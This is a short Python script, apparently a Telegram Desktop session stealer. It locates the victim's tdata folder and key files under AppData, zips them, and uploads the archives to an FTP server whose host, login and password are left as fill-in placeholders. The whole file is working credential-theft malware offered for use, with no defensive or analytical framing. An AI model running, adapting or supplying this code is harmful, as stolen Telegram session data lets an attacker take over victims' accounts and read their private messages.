import os
import sys
import shutil
import zipfile
import traceback
from re import findall
from zipfile import ZipFile
from ftplib import FTP_TLS
from ftplib import FTP
import os, random
import os.path



#Searching path to file
pathusr = os.path.expanduser('~')
#Checking file
file_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0'

way1 = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0' 

found = os.path.exists(file_path)


with ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata.zip','w') as zipObj:
   # Iterate over all the files in directory
   for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\'):
       for filename in filenames:
           #create complete filepath of file in directory
           filePath = os.path.join(folderName, filename)
           # Add file to zip
           zipObj.write(filePath)

#FTP module to connect server
ftp = FTP()
ftp.set_debuglevel(2)
ftp.connect('Host of your FTP', 21) 
ftp.login('Login for your FTP','Pass for your FTP')
ftp.cwd('/folder where you want to save file on FTP server')


if found == True :
    telegram_zip = zipfile.ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata1.zip','w' )
    telegram_zip.write(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0', compress_type=zipfile.ZIP_DEFLATED)
    telegram_zip.close()
    print(ftp.dir())
    fp = open(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata1.zip', 'rb')
    ftp.storbinary('STOR %s' % os.path.basename("tdata1.zip"), fp, 1024)
    fp.close()
    print('Ok!')

else:
    telegram_zip = zipfile.ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata2.zip','w')
    telegram_zip.write(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C1', compress_type=zipfile.ZIP_DEFLATED)
    telegram_zip.close()
    print(ftp.dir())
    fp = open(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata2.zip', 'rb')
    ftp.storbinary('STOR %s' % os.path.basename("tdata2.zip"), fp, 1024)
    fp.close()
    print('Not ok!')



#Sending file on FTP server
print(ftp.dir())
fp = open(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata.zip', 'rb')
ftp.storbinary('STOR %s' % os.path.basename("tdata.zip"), fp, 1024)
fp.close()




